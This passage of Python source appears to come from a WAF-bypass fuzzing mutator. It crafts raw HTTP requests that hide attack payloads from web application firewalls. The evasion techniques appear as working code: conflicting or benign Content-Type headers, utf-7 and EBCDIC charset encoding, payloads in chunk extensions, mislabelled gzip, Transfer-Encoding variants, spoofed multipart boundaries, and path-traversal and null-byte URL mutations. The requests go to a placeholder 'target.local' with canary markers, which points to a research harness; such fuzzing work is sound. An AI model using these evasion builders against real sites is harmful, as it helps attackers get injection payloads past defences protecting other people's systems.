    # ── Post-wire havoc ───────────────────────────────────────────

    def _wire_havoc(self, wire: bytes, intensity: float = 0.15) -> bytes:
        """Apply havoc: 60% structural (protocol-aware), 40% byte-level."""
        if self.rng.random() < 0.60:
            return self._wire_havoc_structural(wire)
        return self._wire_havoc_byte(wire, intensity)

    def _wire_havoc_structural(self, wire: bytes) -> bytes:
        """Protocol-aware mutations that explore HTTP ambiguities."""
        try:
            head, body, delim = _split_header_block(wire)
        except ValueError:
            return wire
        lines = head.split(delim)
        if len(lines) < 2:
            return wire
        req_line = lines[0]
        headers = lines[1:]

        xwf = [h for h in headers if h.lower().startswith(b"x-wf-")]
        other = [h for h in headers if not h.lower().startswith(b"x-wf-")]

        op = self.rng.random()

        if op < 0.15 and other:
            # Duplicate a random non-X-WF header
            other.append(self.rng.choice(other))

        elif op < 0.30 and other:
            # Reorder non-control headers
            self.rng.shuffle(other)

        elif op < 0.45:
            # Mutate Content-Type parameter structure
            ct_indices = [i for i, h in enumerate(other) if h.lower().startswith(b"content-type:")]
            if ct_indices:
                idx = self.rng.choice(ct_indices)
                ct = other[idx]
                params = [
                    b"; charset=utf-7", b"; charset=ibm037", b"; charset=iso-2022-jp",
                    b"; boundary=wf-fake", b"; q=0.9", b"; format=flowed",
                ]
                other[idx] = ct.rstrip() + self.rng.choice(params)
            else:
                # Add a Content-Type header with unusual value
                other.append(b"Content-Type: text/plain; charset=us-ascii")

        elif op < 0.55:
            # Add contradictory Transfer-Encoding or Content-Encoding
            te_variants = [
                b"Transfer-Encoding: chunked", b"Transfer-Encoding: identity",
                b"Transfer-Encoding: \tchunked", b"Transfer-Encoding: CHUNKED",
                b"Content-Encoding: gzip", b"Content-Encoding: identity",
            ]
            other.append(self.rng.choice(te_variants))

        elif op < 0.65:
            # Off-by-N Content-Length
            cl_indices = [i for i, h in enumerate(other) if h.lower().startswith(b"content-length:")]
            if cl_indices:
                idx = self.rng.choice(cl_indices)
                try:
                    cl_val = int(other[idx].split(b":", 1)[1].strip())
                    delta = self.rng.choice([-10, -5, -1, 1, 5, 10])
                    other[idx] = f"Content-Length: {max(0, cl_val + delta)}".encode("ascii")
                except (ValueError, IndexError):
                    pass

        elif op < 0.75 and body:
            # Move payload to a different injection point (query string)
            req_str = req_line.decode("latin-1", errors="replace")
            parts = req_str.split(" ")
            if len(parts) >= 3 and b"?" not in parts[1].encode():
                payload_sample = body[:40].decode("latin-1", errors="replace")
                parts[1] = parts[1] + "?" + payload_sample
                req_line = " ".join(parts).encode("latin-1", errors="replace")

        elif op < 0.85:
            # Change HTTP method
            methods = [b"GET", b"POST", b"PUT", b"PATCH", b"DELETE", b"OPTIONS"]
            req_bytes = req_line
            for m in methods:
                if req_bytes.startswith(m + b" "):
                    new_method = self.rng.choice([x for x in methods if x != m])
                    req_line = new_method + req_bytes[len(m):]
                    break

        else:
            # URL path encoding mutation
            req_str = req_line.decode("latin-1", errors="replace")
            parts = req_str.split(" ")
            if len(parts) >= 3:
                path = parts[1]
                mutations = [
                    lambda p: p.replace("/", "/%2F", 1),
                    lambda p: "/../" + p.lstrip("/"),
                    lambda p: p.replace("/", "\\", 1),
                    lambda p: p + "%00",
                    lambda p: p + "/./",
                ]
                path = self.rng.choice(mutations)(path)
                parts[1] = path
                req_line = " ".join(parts).encode("latin-1", errors="replace")

        new_headers = other + xwf
        result = delim.join([req_line] + new_headers) + delim + delim + body
        if b"X-WF-Request-ID:" not in result:
            return wire
        return result

    def _wire_havoc_byte(self, wire: bytes, intensity: float = 0.15) -> bytes:
        """Apply controlled byte-level mutations preserving X-WF-* headers."""
        data = bytearray(wire)
        wire_len = len(data)
        if wire_len < 40:
            return wire

        # Build protected mask: 0 = mutable, 1 = protected.
        protected = bytearray(wire_len)
        for marker in (b"X-WF-", b"x-wf-"):
            pos = 0
            while True:
                idx = wire.find(marker, pos)
                if idx < 0:
                    break
                line_start = wire.rfind(b"\n", 0, idx)
                line_start = (line_start + 1) if line_start >= 0 else idx
                line_end = wire.find(b"\n", idx)
                line_end = (line_end + 1) if line_end >= 0 else wire_len
                protected[line_start:line_end] = b"\x01" * (line_end - line_start)
                pos = line_end

        # Collect mutable offsets.
        mutable = [i for i in range(wire_len) if not protected[i]]
        if not mutable:
            return wire

        n_mutations = max(1, min(16, int(wire_len * intensity * 0.1)))

        for _ in range(n_mutations):
            idx = self.rng.choice(mutable)
            op = self.rng.random()

            if op < 0.30:
                data[idx] ^= self.rng.randint(1, 255)
            elif op < 0.45:
                if idx < wire_len - 1 and data[idx] == 0x0D and data[idx + 1] == 0x0A:
                    data[idx:idx + 1] = b""
                    break
                elif data[idx] == 0x0A and (idx == 0 or data[idx - 1] != 0x0D):
                    data[idx:idx] = b"\r"
                    break
            elif op < 0.60:
                if data[idx] == ord(":") and idx > 0:
                    if idx + 1 < len(data) and data[idx + 1] == ord(" "):
                        data[idx + 1:idx + 2] = b"\t"
                    elif idx + 1 < len(data) and data[idx + 1] != ord(" "):
                        data[idx + 1:idx + 1] = b" "
                        break
            elif op < 0.75:
                if 0x41 <= data[idx] <= 0x5A:
                    data[idx] |= 0x20
                elif 0x61 <= data[idx] <= 0x7A:
                    data[idx] &= ~0x20
            elif op < 0.85:
                if 0x30 <= data[idx] <= 0x39:
                    data[idx] = self.rng.randint(0x30, 0x39)
                elif 0x41 <= data[idx] <= 0x46:
                    data[idx] = self.rng.randint(0x41, 0x46)
            else:
                ws = self.rng.choice((b" ", b"\t", b" \t"))
                data[idx:idx] = ws
                break

        result = bytes(data)
        if b"X-WF-Request-ID:" not in result:
            return wire
        return result

    # ── Mode selection ────────────────────────────────────────────

    def _pick_lane_mode(self, inp: Input) -> str:
        hinted = str(inp.metadata.get("waf_bypass_mode") or "").strip().lower()
        if hinted in {"stable", "research", "chain"}:
            return hinted
        stable_w, research_w, chain_w = _MODE_WEIGHTS[self.mode]
        return self.rng.choices(
            ("stable", "research", "chain"),
            weights=(stable_w, research_w, chain_w),
            k=1,
        )[0]

    # ── Stable mode ───────────────────────────────────────────────

    def _mutate_stable(
        self, inp: Input, *, fragments: list[WireFragment] | None = None,
    ) -> tuple[bytes, dict[str, object], str]:
        family = self._pick_family(inp)
        lane = self._lane_for_family(family)
        request_id = _rand_id(self.rng)
        canary = _rand_canary(self.rng)
        payload_type = _AXIS_MAP.get(family, ("content_type", "xss", "surface", "header_parse", "duplicate"))[1]
        ptype, payload = _pick_payload(self.rng, payload_type)
        meta = self._family_metadata(
            family, request_id=request_id, canary=canary,
            payload=payload, payload_type=ptype,
        )
        meta.update(self._axes_from_family(family))
        meta["axis_projection"] = self._axis_projection(meta)
        wire = self._build_stream(
            family=family,
            request_id=request_id,
            canary=canary,
            payload=payload,
            payload_type=ptype,
            meta=meta,
        )
        if fragments and not _is_h2_wire(wire) and self.rng.random() < 0.30:
            wire = self._splice_corpus_fragment(wire, self.rng.choice(fragments))
        return wire, meta, lane

    # ── Research mode ─────────────────────────────────────────────

    def _mutate_research(
        self, inp: Input, *, fragments: list[WireFragment] | None = None,
    ) -> tuple[bytes, dict[str, object], str]:
        spec = self._build_research_spec(inp)
        request_id = _rand_id(self.rng)
        canary = _rand_canary(self.rng)
        ptype, payload = _pick_payload(self.rng, spec.payload_type)
        family, match_score = self._derive_variant_family_scored(spec)
        meta = self._research_metadata(
            spec, request_id=request_id, canary=canary,
            payload=payload, payload_type=ptype,
        )
        if match_score >= 3:
            # Good match — use concrete family template
            wire = self._build_stream(
                family=family,
                request_id=request_id,
                canary=canary,
                payload=payload,
                payload_type=ptype,
                meta=meta,
            )
        else:
            # Low match — build generic request + axis-driven transforms
            wire = self._build_generic_request(
                payload=payload, canary=canary,
                request_id=request_id, meta=meta,
            )
            wire = self._apply_axis_transforms(wire, spec)
        if fragments and not _is_h2_wire(wire) and self.rng.random() < 0.30:
            wire = self._splice_corpus_fragment(wire, self.rng.choice(fragments))
        return wire, meta, "research"

    # ── Chain mode ───────────────────────────────────────────────

    def _select_chain_layers(self, base_family: str) -> list[str]:
        """Pick 1-3 chain wrappers compatible with the base family."""
        n_layers = self.rng.choices([1, 2, 3], weights=[0.35, 0.45, 0.20], k=1)[0]

        # Filter wrappers compatible with the base family
        is_url_family = base_family.startswith("url_")
        family_ok: list[str] = []
        for cname in _CHAIN_ORDER:
            if is_url_family and cname not in _CHAIN_HEADER_ONLY:
                continue
            incompat = _CHAIN_INCOMPATIBLE.get(cname, ())
            conflict = False
            for prefix in incompat:
                if prefix.endswith("_") and base_family.startswith(prefix):
                    conflict = True
                    break
                if base_family == prefix:
                    conflict = True
                    break
            if not conflict:
                family_ok.append(cname)
        if not family_ok:
            return []

        # Greedy selection respecting inter-chain mutual exclusion
        self.rng.shuffle(family_ok)
        chosen: list[str] = []
        excluded: set[str] = set()
        for cname in family_ok:
            if len(chosen) >= n_layers:
                break
            if cname in excluded:
                continue
            chosen.append(cname)
            # Mark mutually exclusive transforms as excluded
            for blocked in _CHAIN_MUTUAL_EXCLUSION.get(cname, frozenset()):
                excluded.add(blocked)
        # Sort by canonical order
        order_index = {name: i for i, name in enumerate(_CHAIN_ORDER)}
        chosen.sort(key=lambda x: order_index.get(x, 99))
        return chosen

    def _mutate_chain(
        self, inp: Input, *, fragments: list[WireFragment] | None = None,
    ) -> tuple[bytes, dict[str, object], str]:
        """Chain mode: base family + 1-3 semantic wrappers from different layers."""
        family = self._pick_family(inp)
        wrappers = self._select_chain_layers(family)
        lane = self._lane_for_family(family)
        request_id = _rand_id(self.rng)
        canary = _rand_canary(self.rng)
        payload_type = _AXIS_MAP.get(
            family, ("content_type", "xss", "surface", "header_parse", "duplicate"),
        )[1]
        ptype, payload = _pick_payload(self.rng, payload_type)
        meta = self._family_metadata(
            family, request_id=request_id, canary=canary,
            payload=payload, payload_type=ptype,
        )
        meta.update(self._axes_from_family(family))
        meta["axis_projection"] = self._axis_projection(meta)
        meta["waf_bypass_mode"] = "chain"
        meta["chain_depth"] = len(wrappers)
        meta["chain_layers"] = ",".join(wrappers)

        # Build base wire
        wire = self._build_stream(
            family=family,
            request_id=request_id,
            canary=canary,
            payload=payload,
            payload_type=ptype,
            meta=meta,
        )

        # Apply chain wrappers in canonical order
        for wrapper_name in wrappers:
            fn = _CHAIN_TRANSFORMS[wrapper_name]
            wire = fn(wire, self.rng)

        # Inject chain control headers — skip for H2 binary frames which
        # use binary framing and have no H1 header block to inject into.
        if not _is_h2_wire(wire):
            try:
                head, body, delim = _split_header_block(wire)
                lines = head.split(delim)
                lines.insert(1, f"X-WF-Chain-Depth: {len(wrappers)}".encode("ascii"))
                lines.insert(2, f"X-WF-Chain-Layers: {','.join(wrappers)}".encode("ascii"))
                wire = delim.join(lines) + delim + delim + body
            except ValueError:
                pass

        if fragments and not _is_h2_wire(wire) and self.rng.random() < 0.30:
            wire = self._splice_corpus_fragment(wire, self.rng.choice(fragments))

        return wire, meta, lane

    # ── Family selection ──────────────────────────────────────────

    def _pick_family(self, inp: Input) -> str:
        hint = str(inp.metadata.get("variant_family", "")).strip().lower()
        if hint in _ALL_FAMILIES:
            return hint

        hinted_lane = str(inp.metadata.get("lane", "")).strip().lower()
        if hinted_lane in _LANES and self.rng.random() < 0.50:
            return self._weighted_family_pick(_LANES[hinted_lane])

        # Corpus-biased selection. ``_family_boosts`` is a multiplicative
        # prior from offline E4/E7 feedback (default 1.0 per family), so
        # with no hook applied this stays numerically identical to the
        # old ``max(1, h)`` path.
        total_hits = sum(self._family_hits.values())
        if total_hits > 0 and self.rng.random() < 0.40:
            weighted = {
                f: max(1.0, float(h)) * self._family_boosts.get(f, 1.0)
                for f, h in self._family_hits.items()
            }
            return _pick_weighted(self.rng, weighted)

        lanes = tuple(_LANES)
        weights = tuple(_STABLE_LANE_WEIGHTS[lane] for lane in lanes)
        lane = self.rng.choices(lanes, weights=weights, k=1)[0]
        return self._weighted_family_pick(_LANES[lane])

    @staticmethod
    def _lane_for_family(family: str) -> str:
        for lane, families in _LANES.items():
            if family in families:
                return lane
        return "content_type_confusion"

    # ── Research spec ─────────────────────────────────────────────

    def _build_research_spec(self, inp: Input) -> WafBypassSpec:
        return WafBypassSpec(
            evasion_technique=_pick_weighted(self.rng, _RESEARCH_MODE_WEIGHTS["evasion_technique"]),
            payload_type=_pick_weighted(self.rng, _RESEARCH_MODE_WEIGHTS["payload_type"]),
            hiding_depth=_pick_weighted(self.rng, _RESEARCH_MODE_WEIGHTS["hiding_depth"]),
            parser_target=_pick_weighted(self.rng, _RESEARCH_MODE_WEIGHTS["parser_target"]),
            structural_variant=_pick_weighted(self.rng, _RESEARCH_MODE_WEIGHTS["structural_variant"]),
        )

    def _derive_variant_family(self, spec: WafBypassSpec) -> str:
        """Map research-mode axes back to the closest concrete family."""
        family, _score = self._derive_variant_family_scored(spec)
        return family

    def _derive_variant_family_scored(self, spec: WafBypassSpec) -> tuple[str, int]:
        """Map research-mode axes back to the closest concrete family, return (family, score)."""
        best_family = _ALL_FAMILIES[0]
        best_score = -1
        for fam, axes in _AXIS_MAP.items():
            score = 0
            if axes[0] == spec.evasion_technique:
                score += 3
            if axes[1] == spec.payload_type:
                score += 2
            if axes[2] == spec.hiding_depth:
                score += 1
            if axes[3] == spec.parser_target:
                score += 2
            if axes[4] == spec.structural_variant:
                score += 2
            if score > best_score:
                best_score = score
                best_family = fam
        return best_family, best_score

    # ── Coverage axes ─────────────────────────────────────────────

    def _axes_from_family(self, family: str) -> dict[str, object]:
        evasion, payload_t, depth, parser_t, variant = _AXIS_MAP.get(
            family,
            ("content_type", "xss", "surface", "header_parse", "duplicate"),
        )
        return {
            "axis_evasion": evasion,
            "axis_payload": payload_t,
            "axis_depth": depth,
            "axis_parser": parser_t,
            "axis_variant": variant,
        }

    def _axis_projection(self, meta: dict[str, object]) -> str:
        return (
            f"evasion={meta.get('axis_evasion', 'unknown')}"
            f"|payload={meta.get('axis_payload', 'unknown')}"
            f"|depth={meta.get('axis_depth', 'unknown')}"
            f"|parser={meta.get('axis_parser', 'unknown')}"
            f"|variant={meta.get('axis_variant', 'unknown')}"
        )

    # ── Generic request + axis transforms (research mode fallback) ──

    def _build_generic_request(
        self,
        *,
        payload: str,
        canary: str,
        request_id: str,
        meta: dict[str, object],
    ) -> bytes:
        """Build a minimal valid POST with payload in body — no evasion applied."""
        control = self._base_control_headers(meta)
        body = f"param={canary}&data={payload}".encode("latin-1", errors="replace")
        headers = [
            "Host: target.local",
            "User-Agent: wf-wafbypass/1.0",
            "Accept: */*",
            *control,
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/generic/{request_id}", headers, body)

    _AXIS_TO_TRANSFORMS: "dict[str, list[str]]" = {
        "content_type": ["case_scramble", "ws_inject"],
        "body_encoding": ["encoding_wrap"],
        "multipart": ["encoding_wrap"],
        "header_leniency": ["obs_fold", "ws_inject", "null_inject"],
        "url_normalization": ["case_scramble"],
        "line_terminator": ["lt_mix"],
    }

    def _apply_axis_transforms(self, wire: bytes, spec: WafBypassSpec) -> bytes:
        """Apply transforms driven by the research spec's evasion axis."""
        candidates = self._AXIS_TO_TRANSFORMS.get(spec.evasion_technique, [])
        for name in candidates:
            fn = _TRANSFORMS.get(name)
            if fn and self.rng.random() < 0.6:
                wire = fn(wire, self.rng)
        return wire

    # ── Metadata builders ─────────────────────────────────────────

    def _family_metadata(
        self,
        family: str,
        *,
        request_id: str,
        canary: str,
        payload: str,
        payload_type: str,
    ) -> dict[str, object]:
        return {
            "variant_family": family,
            "taxonomy_tags": list(_TAG_MAP.get(family, (family,))),
            "request_id": request_id,
            "canary_marker": canary,
            "payload_type": payload_type,
            "payload_b64": base64.b64encode(payload.encode()).decode(),
            "base_payload_blocked": True,
        }

    def _research_metadata(
        self,
        spec: WafBypassSpec,
        *,
        request_id: str,
        canary: str,
        payload: str,
        payload_type: str,
    ) -> dict[str, object]:
        family = self._derive_variant_family(spec)
        tags = list(_TAG_MAP.get(family, (family,)))
        tags.extend([
            f"evasion={spec.evasion_technique}",
            f"depth={spec.hiding_depth}",
            f"parser={spec.parser_target}",
        ])
        tags = list(dict.fromkeys(tags))
        axes = {
            "axis_evasion": spec.evasion_technique,
            "axis_payload": spec.payload_type,
            "axis_depth": spec.hiding_depth,
            "axis_parser": spec.parser_target,
            "axis_variant": spec.structural_variant,
        }
        return {
            "variant_family": family,
            "taxonomy_tags": tags,
            "request_id": request_id,
            "canary_marker": canary,
            "payload_type": payload_type,
            "payload_b64": base64.b64encode(payload.encode()).decode(),
            "waf_bypass_mode": "research",
            "base_payload_blocked": True,
            **axes,
            "axis_projection": self._axis_projection(axes),
        }

    # ── X-WF-* control headers ────────────────────────────────────

    def _base_control_headers(
        self,
        meta: dict[str, object],
    ) -> list[str]:
        tags = ",".join(str(t) for t in meta.get("taxonomy_tags", []))
        return [
            f"X-WF-Request-ID: {meta['request_id']}",
            f"X-WF-Family: {meta['variant_family']}",
            f"X-WF-Tags: {tags}",
            f"X-WF-Canary-Marker: {meta['canary_marker']}",
            f"X-WF-Payload-Type: {meta['payload_type']}",
            f"X-WF-Payload: {meta['payload_b64']}",
            f"X-WF-Axis-Evasion: {meta.get('axis_evasion', 'unknown')}",
            f"X-WF-Axis-Payload: {meta.get('axis_payload', 'unknown')}",
            f"X-WF-Axis-Depth: {meta.get('axis_depth', 'unknown')}",
            f"X-WF-Axis-Parser: {meta.get('axis_parser', 'unknown')}",
            f"X-WF-Axis-Variant: {meta.get('axis_variant', 'unknown')}",
            f"X-WF-Mode: {meta.get('waf_bypass_mode', 'stable')}",
        ]

    # ══════════════════════════════════════════════════════════════
    # Family builders — one per family
    # ══════════════════════════════════════════════════════════════

    def _build_stream(
        self,
        *,
        family: str,
        request_id: str,
        canary: str,
        payload: str,
        payload_type: str,
        meta: dict[str, object],
    ) -> bytes:
        """Dispatch to per-family builder and return raw wire bytes."""
        control = self._base_control_headers(meta)
        base_headers = [
            "Host: target.local",
            "User-Agent: wf-wafbypass/1.0",
            "Accept: */*",
            *control,
        ]

        builder = getattr(self, f"_build_{family}", None)
        if builder is not None:
            wire = builder(
                payload=payload,
                canary=canary,
                request_id=request_id,
                base_headers=base_headers,
            )
            # H2 binary: prepend a text control envelope so _extract_control
            # in the target can parse X-WF-* metadata without HPACK decoding.
            # Format: X-WF-* lines\r\n\r\n[H2 binary]
            # _extract_control detects the envelope when lines[0] starts with x-wf-.
            if isinstance(wire, bytes) and wire.startswith(H2_CLIENT_PREFACE):  # pure H2, not yet enveloped
                envelope = "\r\n".join(control).encode("ascii", errors="replace") + b"\r\n\r\n"
                wire = envelope + wire
            return wire

        # Fallback: plain GET with payload in query.
        path = f"/test?q={payload}&c={canary}"
        return _render_request("GET", path, base_headers)

    # ── content_type_confusion ────────────────────────────────────

    def _build_ct_duplicate(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Two Content-Type headers: WAF sees text/plain, backend sees urlencoded."""
        body = f"param={canary}&data={payload}".encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            "Content-Type: text/plain",
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/submit/{request_id}", headers, body)

    def _build_ct_benign_type(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Benign MIME type first to skip WAF body inspection, real CT second.

        Many WAFs skip body inspection for binary content types (image/png,
        application/pdf, etc.) as a performance optimisation.  If the WAF
        reads the first Content-Type and the backend reads the last one,
        the payload passes through uninspected.

        Variants:
          - Duplicate CT headers (first=benign, second=real)
          - Reverse order (first=real, second=benign) for last-wins WAFs
          - Single benign CT with form-encoded body (some backends ignore CT)
        """
        benign_types = [
            "image/png", "image/jpeg", "image/gif", "image/webp",
            "application/pdf", "application/octet-stream",
            "application/zip", "video/mp4", "audio/mpeg",
            "font/woff2", "application/wasm",
        ]
        real_types = [
            "application/x-www-form-urlencoded",
            "text/xml",
            "application/json",
        ]
        benign = self.rng.choice(benign_types)
        real = self.rng.choice(real_types)
        body = f"param={canary}&data={payload}".encode("latin-1", errors="replace")

        variant = self.rng.choice(["benign_first", "real_first", "benign_only"])
        if variant == "benign_first":
            # WAF sees benign → skip; backend sees real → parse
            headers = [
                *base_headers,
                f"Content-Type: {benign}",
                f"Content-Type: {real}",
                f"Content-Length: {len(body)}",
            ]
        elif variant == "real_first":
            # For WAFs that read the last CT
            headers = [
                *base_headers,
                f"Content-Type: {real}",
                f"Content-Type: {benign}",
                f"Content-Length: {len(body)}",
            ]
        else:
            # Single benign CT — backend may still parse form body by default
            headers = [
                *base_headers,
                f"Content-Type: {benign}",
                f"Content-Length: {len(body)}",
            ]
        return _render_request("POST", f"/submit/{request_id}", headers, body)

    def _build_ct_charset_trick(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Charset= parameter tricks with actual body encoding.

        WAF may not re-decode the body per the declared charset, so the
        payload passes through as opaque bytes.  The backend that honours
        the charset will decode it back to the original payload.
        """
        raw = f"param={canary}&data={payload}"
        charset = self.rng.choice(["utf-7", "ibm037", "utf-16le", "iso-2022-jp"])
        try:
            body = raw.encode(charset)
        except (UnicodeEncodeError, LookupError):
            body = raw.encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            f"Content-Type: application/x-www-form-urlencoded; charset={charset}",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/submit/{request_id}", headers, body)

    def _build_ct_boundary_mismatch(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """CT boundary differs from actual body boundary."""
        real_boundary = f"----WfBoundary{_ascii_pad(self.rng, 8)}"
        fake_boundary = f"----FakeBound{_ascii_pad(self.rng, 8)}"
        body_parts = (
            f"--{real_boundary}\r\n"
            f"Content-Disposition: form-data; name=\"field\"\r\n\r\n"
            f"{canary}\r\n"
            f"--{real_boundary}\r\n"
            f"Content-Disposition: form-data; name=\"data\"\r\n\r\n"
            f"{payload}\r\n"
            f"--{real_boundary}--\r\n"
        ).encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            f"Content-Type: multipart/form-data; boundary={fake_boundary}",
            f"Content-Length: {len(body_parts)}",
        ]
        return _render_request("POST", f"/upload/{request_id}", headers, body_parts)

    def _build_ct_multipart_urlenc(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """CT says multipart but body is actually URL-encoded."""
        boundary = f"----WfBound{_ascii_pad(self.rng, 8)}"
        body = f"param={canary}&data={payload}".encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            f"Content-Type: multipart/form-data; boundary={boundary}",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/submit/{request_id}", headers, body)

    def _build_ct_case_variation(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Content-Type header with non-standard casing."""
        ct_name = self.rng.choice([
            "CONTENT-TYPE", "content-TYPE", "Content-type",
            "cOnTeNt-TyPe", "CONTENT-type",
        ])
        body = f"param={canary}&data={payload}".encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            f"{ct_name}: application/x-www-form-urlencoded",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/submit/{request_id}", headers, body)

    def _build_ct_parameter_padding(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Extra whitespace/parameters in Content-Type value."""
        padding = self.rng.choice([
            "  ;  ",
            " ; boundary=x ; ",
            "\t;\t",
            " ; charset=utf-8 ; boundary=none ",
        ])
        body = f"param={canary}&data={payload}".encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            f"Content-Type: application/x-www-form-urlencoded{padding}",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/submit/{request_id}", headers, body)

    def _build_ct_json_smuggle(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """JSON content smuggling: CT/body type mismatch or Unicode escapes.

        Variant A: CT=JSON, body=urlencoded — WAF uses JSON parser, misses form params.
        Variant B: CT=urlencoded, body=JSON — WAF uses form parser, misses JSON values.
        Variant C: JSON with Unicode escapes — \\u003c instead of <, WAF only detects raw chars.
        """
        variant = self.rng.choice(["json_ct_form_body", "form_ct_json_body", "json_unicode_escape"])
        if variant == "json_ct_form_body":
            body = f"param={canary}&data={payload}".encode("latin-1", errors="replace")
            headers = [
                *base_headers,
                "Content-Type: application/json",
                f"Content-Length: {len(body)}",
            ]
        elif variant == "form_ct_json_body":
            import json as _json
            body = _json.dumps({"param": canary, "data": payload}).encode("utf-8")
            headers = [
                *base_headers,
                "Content-Type: application/x-www-form-urlencoded",
                f"Content-Length: {len(body)}",
            ]
        else:
            # Unicode-escape the payload chars in JSON
            escaped_payload = "".join(f"\\u{ord(c):04x}" for c in payload)
            body = f'{{"param":"{canary}","data":"{escaped_payload}"}}'.encode("utf-8")
            headers = [
                *base_headers,
                "Content-Type: application/json",
                f"Content-Length: {len(body)}",
            ]
        return _render_request("POST", f"/api/{request_id}", headers, body)

    # ── body_encoding ─────────────────────────────────────────────

    def _build_enc_chunked_hide(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Payload hidden in chunk extension field."""
        body_data = f"canary={canary}".encode("ascii")
        chunk_size = f"{len(body_data):X}"
        ext_payload = payload.replace(" ", "+")
        chunk_line = f"{chunk_size};ext={ext_payload}\r\n".encode("latin-1", errors="replace")
        body = chunk_line + body_data + b"\r\n0\r\n\r\n"
        headers = [
            *base_headers,
            "Transfer-Encoding: chunked",
            f"Content-Length: {len(body_data)}",
        ]
        return _render_request("POST", f"/api/{request_id}", headers, body)

    def _build_enc_gzip_mismatch(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Content-Encoding says gzip but body is raw deflate."""
        raw = f"param={canary}&data={payload}".encode("utf-8")
        # Raw deflate (no zlib/gzip wrapper) — CE says gzip but body isn't.
        c = zlib.compressobj(6, zlib.DEFLATED, -zlib.MAX_WBITS)
        deflated = c.compress(raw) + c.flush()
        headers = [
            *base_headers,
            "Content-Encoding: gzip",
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {len(deflated)}",
        ]
        return _render_request("POST", f"/api/{request_id}", headers, deflated)

    def _build_enc_nested_encoding(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Double gzip encoding: body compressed twice."""
        raw = f"param={canary}&data={payload}".encode("utf-8")
        compressed_once = gzip.compress(raw, compresslevel=6)
        compressed_twice = gzip.compress(compressed_once, compresslevel=6)
        headers = [
            *base_headers,
            "Content-Encoding: gzip, gzip",
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {len(compressed_twice)}",
        ]
        return _render_request("POST", f"/api/{request_id}", headers, compressed_twice)

    def _build_enc_identity_labeled(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Content-Encoding: identity (explicit passthrough, some WAFs skip body)."""
        body = f"param={canary}&cmd={payload}".encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            "Content-Encoding: identity",
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/api/{request_id}", headers, body)

    def _build_enc_chunked_gzip(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """TE:chunked + CE:gzip combined — payload in compressed chunk body."""
        raw = f"param={canary}&data={payload}".encode("utf-8")
        compressed = gzip.compress(raw, compresslevel=6)
        chunk_size = f"{len(compressed):X}"
        body = (
            f"{chunk_size}\r\n".encode("ascii")
            + compressed
            + b"\r\n0\r\n\r\n"
        )
        headers = [
            *base_headers,
            "Transfer-Encoding: chunked",
            "Content-Encoding: gzip",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/api/{request_id}", headers, body)

    def _build_enc_te_variation(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Chunked Transfer-Encoding value variations that confuse WAF parsers.

        WAFs may only recognise the exact string 'chunked'; variations like
        leading tabs, mixed case, trailing whitespace, or obs-fold cause the
        WAF to miss the chunked body while the backend processes it normally.
        """
        body_data = f"param={canary}&data={payload}".encode("latin-1", errors="replace")
        chunk_size = f"{len(body_data):X}"
        body = f"{chunk_size}\r\n".encode("ascii") + body_data + b"\r\n0\r\n\r\n"

        variant = self.rng.choice([
            "\tchunked",           # leading tab
            "Chunked",             # mixed case
            "CHUNKED",             # all upper
            "chunked, identity",   # list value
            "chunked ",            # trailing whitespace
        ])
        headers = [
            *base_headers,
            f"Transfer-Encoding: {variant}",
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {len(body_data)}",
        ]
        return _render_request("POST", f"/api/{request_id}", headers, body)

    # ── multipart_tricks ──────────────────────────────────────────

    def _build_mp_boundary_spoof(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Boundary with special characters that break WAF regex."""
        special = self.rng.choice(["'", '"', "()", "=", " +", ";"])
        boundary = f"----Wf{special}Bound{_ascii_pad(self.rng, 6)}"
        body_str = (
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"field\"\r\n\r\n"
            f"{canary}\r\n"
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"data\"\r\n\r\n"
            f"{payload}\r\n"
            f"--{boundary}--\r\n"
        )
        body = body_str.encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            f"Content-Type: multipart/form-data; boundary={boundary}",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/upload/{request_id}", headers, body)

